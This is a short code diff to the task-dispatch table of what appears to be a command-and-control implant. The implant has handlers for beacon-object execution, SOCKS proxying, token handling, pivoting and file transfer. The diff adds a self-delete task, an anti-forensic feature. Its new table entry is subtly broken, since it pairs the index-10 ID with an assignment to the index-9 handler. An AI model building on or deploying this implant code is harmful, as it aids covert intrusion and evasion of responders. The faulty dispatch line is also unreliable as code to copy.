@@ -1960,6 +1960,10 @@ public:
         _In_ JOBS* Job
     ) -> ERROR_CODE;
 
+    auto SelfDel(
+        _In_ JOBS* Job
+    ) -> ERROR_CODE;
+
     auto Download(
         _In_ JOBS* Job
     ) -> ERROR_CODE;
@@ -2002,16 +2006,17 @@ public:
         ULONG        ID;
         ERROR_CODE ( Task::*Run )( JOBS* );
     } Mgmt[TSK_LENGTH] = {
-        Mgmt[0].ID = TskExit,       Mgmt[0].Run = &Task::Exit,
-        Mgmt[1].ID = TskFileSystem, Mgmt[1].Run = &Task::FileSystem,
-        Mgmt[2].ID = TskProcess,    Mgmt[2].Run = &Task::Process,
-        Mgmt[3].ID = TskExecBof,    Mgmt[3].Run = &Task::ExecBof,
-        Mgmt[4].ID = TskConfig,     Mgmt[4].Run = &Task::Config,
-        Mgmt[5].ID = TskDownload,   Mgmt[5].Run = &Task::Download,
-        Mgmt[6].ID = TskUpload,     Mgmt[6].Run = &Task::Upload,
-        Mgmt[7].ID = TskSocks,      Mgmt[7].Run = &Task::Socks,
-        Mgmt[8].ID = TskToken,      Mgmt[8].Run = &Task::Token,
-        Mgmt[9].ID = TskPivot,      Mgmt[9].Run = &Task::Pivot
+        Mgmt[0].ID  = TskExit,       Mgmt[0].Run = &Task::Exit,
+        Mgmt[1].ID  = TskFileSystem, Mgmt[1].Run = &Task::FileSystem,
+        Mgmt[2].ID  = TskProcess,    Mgmt[2].Run = &Task::Process,
+        Mgmt[3].ID  = TskExecBof,    Mgmt[3].Run = &Task::ExecBof,
+        Mgmt[4].ID  = TskConfig,     Mgmt[4].Run = &Task::Config,
+        Mgmt[5].ID  = TskDownload,   Mgmt[5].Run = &Task::Download,
+        Mgmt[6].ID  = TskUpload,     Mgmt[6].Run = &Task::Upload,
+        Mgmt[7].ID  = TskSocks,      Mgmt[7].Run = &Task::Socks,
+        Mgmt[8].ID  = TskToken,      Mgmt[8].Run = &Task::Token,
+        Mgmt[9].ID  = TskPivot,      Mgmt[9].Run = &Task::Pivot,
+        Mgmt[10].ID = TskSelfDelete, Mgmt[9].Run = &Task::SelfDel
     };
 };
 
